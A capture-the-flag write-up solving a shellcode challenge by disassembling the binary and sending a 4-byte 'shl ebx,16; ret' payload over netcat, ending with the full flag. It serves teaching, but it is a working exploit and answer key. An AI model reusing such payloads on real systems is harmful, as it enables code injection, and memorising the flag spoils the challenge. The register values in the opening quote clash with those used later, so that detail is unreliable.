# SHL33T - CTF PWN Challenge Writeup

---

"Mischievous elves had tampered with Nibblетор's EBX register, and I needed to restore it to save Christmas." 

Connecting to the instance:

```bash
nc <ip> <port>
```

The service displayed an ASCII art: 

*"These elves are playing with me again, look at this mess: ebx = 0x06001337. It should be ebx = 0x1337000 instead!"*

The current value and target value are clearly different, and I needed to figure out how to change it.

## Understanding the Binary

I started by examining the actual binary file locally using `objdump`:

```bash
objdump -d shl33t | grep -A 30 "^0000.*<main>:" | head -40
```

This gave me the disassembly of the main function. Looking at the code, I discovered several critical things:

1. At offset `+73` (address `0x555555555a11`), the program explicitly sets EBX to `0x1337`:
   ```assembly
   mov $0x1337,%ebx
   ```

2. Later, at offset `+170`, the program calls `mmap` to allocate executable memory:
   ```assembly
   call 0x5555555551a0 <mmap@plt>
   ```

3. At offset `+228`, it reads exactly **4 bytes** from stdin:
   ```assembly
   mov $0x4,%edx
   call 0x5555555551e0 <read@plt>
   ```

4. At offset `+286`, here's the critical part—it executes my input as code:
   ```assembly
   call *%rax
   ```

5. After executing my code, it checks if EBX equals `0x13370000`:
   ```assembly
   cmpl $0x13370000,-0x34(%rbp)
   ```

This was a **shellcode challenge**. I had to write 4 bytes of machine code that would modify the EBX register to the correct value.

## The Constraint

Here's where it got tricky: I could only send **4 bytes maximum**. 

The straightforward approach would be:
```assembly
mov $0x13370000, %ebx
```

But when I calculated the machine code for this instruction, it required **5 bytes**: `bb 00 00 37 13`. That was one byte too many.

## The Breakthrough

I looked at the values more carefully:
- Current EBX: `0x1337`
- Target EBX: `0x13370000`

Thought process: If I take `0x1337` and shift it left by 16 bits, I get `0x13370000`. 

The solution wasn't to set EBX to an arbitrary value—it was to **shift the existing value**.

The instruction `shl $0x10, %ebx` (shift EBX left by 0x10, which is 16 in decimal) would do exactly what I needed.

## Crafting the Shellcode

I looked up the machine code encoding for the shift instruction:
- `c1` = the SHL opcode (shift left)
- `e3` = the ModRM byte (specifying EBX as the operand)
- `10` = the shift amount (16)
- `c3` = the RET instruction (to properly return from shellcode)

And its **exactly 4 bytes**: `\xc1\xe3\x10\xc3`

Breaking it down:
1. `\xc1\xe3\x10` - Shift EBX left by 16 bits (3 bytes)
2. `\xc3` - Return from shellcode (1 byte)

Total: 4 bytes. Perfect fit.

## Testing the Theory


```bash
printf '\xc1\xe3\x10\xc3' | nc <ip> <port>
```

The service responded with:

```
[Nibblетop] HOORAY! You saved Christmas again!! Here is your prize:
HTB{shift_2_th3_lift_shift_2_th3_right_2038ddb0058f541b352a2267768bdf}
```

Execution flow:

1. **Program Setup**: The binary initializes, sets EBX to `0x1337`, and displays the challenge message.

2. **Memory Allocation**: It allocates 0x1000 bytes of executable memory using `mmap` with `PROT_EXEC` permissions.

3. **Reading Input**: It reads exactly 4 bytes from stdin into that executable memory region.

4. **Executing Shellcode**: It calls the address of that memory, effectively executing my 4-byte payload.

5. **The Shift**: My shellcode executes:
   - `shl $0x10, %ebx` shifts all bits in EBX left by 16 positions
   - `0x1337 << 16 = 0x13370000`
   - The RET instruction returns control back to the program

6. **The Check**: The program verifies that EBX now equals `0x13370000` and shows the success message.

7. **Flag revealed**:

## Key Lessons Learned

**1. Register Manipulation**: Understanding how CPU registers work and what values they contain is fundamental to exploitation.

**2. Bit Operations**: This challenge was essentially asking me to perform a bit shift operation. Knowing assembly instructions like `shl` (shift left) and `shr` (shift right) is crucial.

**3. Encoding Constraints**: Sometimes the hardest part of writing shellcode isn't the logic—it's fitting it into the byte limit. I had to be creative and think about existing values rather than setting new ones from scratch.

**4. Machine Code vs Assembly**: Converting assembly instructions to their hexadecimal machine code representation is essential for shellcode writing.

**5. Binary Analysis**: Using tools like `objdump` to disassemble binaries and understand the program flow was critical to solving this challenge.

## The Final Payload

```bash
printf '\xc1\xe3\x10\xc3' | nc <ip> <port>
```

This simple command:
- Generates 4 bytes: shift EBX left 16 bits, then return
- Sends them to the service
- Transforms `0x1337` into `0x13370000`
- Saves Christmas
- Captures the flag
---

**Flag**: `HTB{shift_2_th3_lift_shift_2_th3_right_2038ddb0058f541b352a2267768bdf}`
